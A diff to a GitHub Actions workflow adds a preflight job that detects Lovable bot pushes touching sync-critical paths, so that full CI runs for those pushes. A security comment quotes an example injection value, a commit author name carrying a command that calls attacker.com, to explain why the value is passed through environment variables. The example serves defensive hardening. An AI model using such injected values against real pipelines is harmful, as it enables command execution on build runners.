@@ -35,13 +35,21 @@ concurrency:
   cancel-in-progress: ${{ github.event_name == 'pull_request' }}
 
 # Skip CI on direct pushes to main from the Lovable bot
-# (`gpt-engineer-app[bot]`). Lovable pushes to main several times a day and
+# (`gpt-engineer-app[bot]`) — UNLESS the push touches sync-critical paths
+# (see `preflight` job below). Lovable pushes to main several times a day and
 # never opens PRs, so each push otherwise consumes ~5 min of Actions minutes
 # across 8 jobs. With PR #155's grace mode in place, Lovable's budget overshoots
 # are surfaced in the daily digest issue (label `lovable-budget-overshoot`)
 # even when CI doesn't run, so we lose negligible signal by skipping the run
-# itself. PRs (Devin's, contributors') still get full CI regardless of actor;
-# `workflow_dispatch` runs (e.g. the auth-gated e2e suite) also still fire.
+# for cosmetic Lovable commits.
+#
+# Sync-critical carve-out (audit Sprint 1C — Finding 4):
+#   The default skip is dangerous if Lovable touches the sync engine because
+#   regressions in `useAutoSync`, `atomic-sync-manager`, `offline-storage`,
+#   `cached-auth` etc. are exactly the failure mode that produced the
+#   stuck-pending iPad complaint. The `preflight` job below diffs the push
+#   against HEAD^ and emits `sync_critical=true` when any tracked path matches;
+#   downstream jobs then run on Lovable pushes that touch those files.
 #
 # Detection: `github.event.head_commit.author.name`, NOT `github.actor`.
 # When a GitHub App pushes via its installation token, `github.actor`
@@ -57,10 +65,85 @@ concurrency:
 # gating job would still consume an Actions minute. The condition is the
 # same on every job, by design.
 jobs:
+  # Always-runs preflight job that classifies the trigger and (for push
+  # events) detects whether the changed files touch sync-critical paths.
+  # Outputs are consumed by every other job's `if:` clause via `needs.preflight.outputs.*`.
+  # Cost is one ~15s ubuntu-latest minute per CI invocation; trivial relative to
+  # the protection it provides against Lovable silent regressions in sync code.
+  preflight:
+    name: preflight (Lovable + sync-critical detector)
+    runs-on: ubuntu-latest
+    outputs:
+      is_lovable: ${{ steps.detect.outputs.is_lovable }}
+      sync_critical: ${{ steps.detect.outputs.sync_critical }}
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          # Need HEAD^ to diff against for push events. Default fetch-depth=1
+          # would only grab HEAD, making `git diff HEAD^ HEAD` fail.
+          fetch-depth: 2
+      - id: detect
+        env:
+          # SECURITY: pass user-controlled values via env, NEVER interpolate
+          # them directly with ${{ … }} in a `run:` shell block. A commit
+          # author name like `"; curl attacker.com #` would otherwise be
+          # injected verbatim into the script (Devin Review #165 finding).
+          # The `if:` expressions on downstream jobs evaluate this value as
+          # a GitHub-Actions expression (not shell), so they're safe — but
+          # this `run:` step is shell, hence the env-var indirection.
+          COMMIT_AUTHOR: ${{ github.event.head_commit.author.name }}
+          EVENT_NAME: ${{ github.event_name }}
+        run: |
+          set -euo pipefail
+          if [[ "$COMMIT_AUTHOR" == "gpt-engineer-app[bot]" ]]; then
+            echo "is_lovable=true" >> "$GITHUB_OUTPUT"
+          else
+            echo "is_lovable=false" >> "$GITHUB_OUTPUT"
+          fi
+          # For non-push events the carve-out is moot — those jobs gate on
+          # `github.event_name != 'push'` directly and never consult sync_critical.
+          if [[ "$EVENT_NAME" != "push" ]]; then
+            echo "sync_critical=false" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+          # `github.event.before` is `000…` on the first push to a new branch,
+          # which makes a direct `git diff $before HEAD` fail. Comparing against
+          # HEAD^ is robust to that case (the parent always exists for non-root
+          # commits) and to force-pushes, which still leave a meaningful HEAD^.
+          files="$(git diff --name-only HEAD^ HEAD 2>/dev/null || true)"
+          echo "Changed files in push:"
+          echo "$files"
+          # Sync-critical surface area (audit Finding 4). Touching ANY of these
+          # files from a Lovable push triggers full CI for that push:
+          #   - src/lib/{atomic-,}sync* (sync engine + helpers)
+          #   - src/lib/offline-storage* (IDB store, queue mutators)
+          #   - src/lib/cached-auth* (auth cache used by performSync)
+          #   - src/lib/sync-quarantine* (quarantine threshold)
+          #   - src/lib/sync-manager* (photo upload pipeline)
+          #   - src/lib/local-backup-ledger* (snapshot ledger)
+          #   - src/lib/transaction-manager* (atomic-sync wrapper)
+          #   - src/lib/restore-lock* (cross-tab restore coordination)
+          #   - src/lib/sync-events* (inter-module event bus)
+          #   - src/lib/sync-halt-tracker* (PR A — silent-halt surface)
+          #   - src/lib/stuck-photo-beacon* (PR B — Sentry beacon)
+          #   - src/lib/sync-diagnostics* (Lovable's orphan/temp-parent reader)
+          #   - src/hooks/useAutoSync* (the sync orchestrator hook)
+          #   - src/hooks/useUnsyncedPhotos* (photo readers)
+          #   - src/hooks/usePWAState* (sync-status surface for the UI)
+          #   - .github/workflows/* (CI itself — never skip CI on CI changes)
+          critical_pattern='^(src/lib/(sync|atomic-sync|offline-storage|cached-auth|sync-quarantine|sync-manager|local-backup-ledger|transaction-manager|restore-lock|sync-events|sync-halt-tracker|stuck-photo-beacon|sync-diagnostics)|src/hooks/(useAutoSync|useUnsyncedPhotos|usePWAState)|\.github/workflows/)'
+          if echo "$files" | grep -qE "$critical_pattern"; then
+            echo "sync_critical=true" >> "$GITHUB_OUTPUT"
+            echo "Sync-critical paths touched — full CI will run on this push."
+          else
+            echo "sync_critical=false" >> "$GITHUB_OUTPUT"
+          fi
+
   typecheck:
     name: tsc --noEmit
     runs-on: ubuntu-latest
-    if: ${{ github.event_name != 'push' || github.event.head_commit.author.name != 'gpt-engineer-app[bot]' }}
+    needs: [preflight]
+    if: ${{ github.event_name != 'push' || needs.preflight.outputs.is_lovable != 'true' || needs.preflight.outputs.sync_critical == 'true' }}
     steps:
       - uses: actions/checkout@v4
       - uses: oven-sh/setup-bun@v2
@@ -72,7 +155,8 @@ jobs:
   any-budget:
     name: lint:any-budget gate
     runs-on: ubuntu-latest
-    if: ${{ github.event_name != 'push' || github.event.head_commit.author.name != 'gpt-engineer-app[bot]' }}
+    needs: [preflight]
+    if: ${{ github.event_name != 'push' || needs.preflight.outputs.is_lovable != 'true' || needs.preflight.outputs.sync_critical == 'true' }}
     steps:
       - uses: actions/checkout@v4
       - uses: oven-sh/setup-bun@v2
@@ -84,7 +168,8 @@ jobs:
   test:
     name: vitest
     runs-on: ubuntu-latest
-    if: ${{ github.event_name != 'push' || github.event.head_commit.author.name != 'gpt-engineer-app[bot]' }}
+    needs: [preflight]
+    if: ${{ github.event_name != 'push' || needs.preflight.outputs.is_lovable != 'true' || needs.preflight.outputs.sync_critical == 'true' }}
     steps:
       - uses: actions/checkout@v4
       - uses: oven-sh/setup-bun@v2
@@ -96,7 +181,8 @@ jobs:
   build:
     name: vite build (incl. db-version parity check)
     runs-on: ubuntu-latest
-    if: ${{ github.event_name != 'push' || github.event.head_commit.author.name != 'gpt-engineer-app[bot]' }}
+    needs: [preflight]
+    if: ${{ github.event_name != 'push' || needs.preflight.outputs.is_lovable != 'true' || needs.preflight.outputs.sync_critical == 'true' }}
     steps:
       - uses: actions/checkout@v4
       - uses: oven-sh/setup-bun@v2
@@ -110,7 +196,8 @@ jobs:
   bundle-size:
     name: bundle-size budget gate
     runs-on: ubuntu-latest
-    if: ${{ github.event_name != 'push' || github.event.head_commit.author.name != 'gpt-engineer-app[bot]' }}
+    needs: [preflight]
+    if: ${{ github.event_name != 'push' || needs.preflight.outputs.is_lovable != 'true' || needs.preflight.outputs.sync_critical == 'true' }}
     steps:
       - uses: actions/checkout@v4
       - uses: oven-sh/setup-bun@v2
@@ -126,7 +213,8 @@ jobs:
   audit-critical:
     name: bun audit (critical gate)
     runs-on: ubuntu-latest
-    if: ${{ github.event_name != 'push' || github.event.head_commit.author.name != 'gpt-engineer-app[bot]' }}
+    needs: [preflight]
+    if: ${{ github.event_name != 'push' || needs.preflight.outputs.is_lovable != 'true' || needs.preflight.outputs.sync_critical == 'true' }}
     steps:
       - uses: actions/checkout@v4
       - uses: oven-sh/setup-bun@v2
@@ -146,7 +234,8 @@ jobs:
   audit-high:
     name: bun audit (high — advisory only)
     runs-on: ubuntu-latest
-    if: ${{ github.event_name != 'push' || github.event.head_commit.author.name != 'gpt-engineer-app[bot]' }}
+    needs: [preflight]
+    if: ${{ github.event_name != 'push' || needs.preflight.outputs.is_lovable != 'true' || needs.preflight.outputs.sync_critical == 'true' }}
     # Non-blocking: this job runs and reports findings to the PR's checks tab
     # so high-severity transitive advisories are visible, but it does NOT fail
     # the build. Renovate's `vulnerabilityAlerts` block (renovate.json) opens
@@ -188,7 +277,8 @@ jobs:
   e2e-smoke:
     name: playwright e2e (smoke)
     runs-on: ubuntu-latest
-    if: ${{ github.event_name != 'push' || github.event.head_commit.author.name != 'gpt-engineer-app[bot]' }}
+    needs: [preflight]
+    if: ${{ github.event_name != 'push' || needs.preflight.outputs.is_lovable != 'true' || needs.preflight.outputs.sync_critical == 'true' }}
     # 8 min covers cold-cache build (~100s) + Chromium download (~60s) +
     # smoke specs (~30s with retries) with headroom.
     timeout-minutes: 8
